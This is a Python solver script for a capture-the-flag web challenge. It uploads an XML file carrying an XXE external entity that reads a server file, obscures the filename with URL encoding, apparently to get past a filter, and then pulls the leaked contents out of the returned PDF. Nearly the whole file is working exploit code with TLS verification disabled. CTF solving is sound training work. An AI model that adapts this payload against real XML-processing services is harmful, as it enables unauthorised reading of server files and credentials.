#!/usr/bin/env python3
import warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

import requests
import re
from io import BytesIO
import PyPDF2

# Payload XXE
PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
    <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
    <title>Testing</title>
    <author>Test</author>
    <year>2026</year>
    <isbn>123</isbn>
    <chapters>
        <chapter number="1">
            <title>Data</title>
            <content>&xxe;</content>
        </chapter>
    </chapters>
</book>"""

def main():
    url = "https://pdfile.ctf.pascalctf.it/upload"

    files = {'file': ('exploit.pasx', PAYLOAD.encode(), 'application/xml')}
    
    try:
        r = requests.post(url, files=files, verify=False, timeout=10)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Upload failed: {e}")
        return
    
    # Parse JSON response para obtener URL del PDF
    try:
        data = r.json()
        pdf_url = data.get('pdf_url')
        if not pdf_url:
            print("[-] No PDF URL in response")
            print(f"[*] Response: {r.text[:500]}")
            return
    except:
        print(f"[-] Failed to parse JSON: {r.text[:500]}")
        return
    
    # Construir URL completa si es relativa
    if not pdf_url.startswith('http'):
        pdf_url = f"https://pdfile.ctf.pascalctf.it{pdf_url}"
    
    
    try:
        pdf_r = requests.get(pdf_url, verify=False, timeout=10)
        pdf_r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] PDF download failed: {e}")
        return
    
    # Guardar PDF
    with open('output.pdf', 'wb') as f:
        f.write(pdf_r.content)
    
    # Intentar extraer texto del PDF
    try:
        pdf_reader = PyPDF2.PdfReader(BytesIO(pdf_r.content))
        text = ""
        for page in pdf_reader.pages:
            text += page.extract_text()
        
        # Buscar la flag
        flag_match = re.search(r'pascalCTF\{[^}]+\}', text)
        if flag_match:
            print(f"Flag: {flag_match.group()}")
        else:
            print("\n[*] Full text from PDF:")
            print(text[:500])
            print("\n[*] (Check output.pdf for complete content)")
    except ImportError:
        print("[!] PyPDF2 not installed. Try: pip install PyPDF2")
        print("[*] Check output.pdf manually or use: pdftotext output.pdf -")

if __name__ == "__main__":
    main()
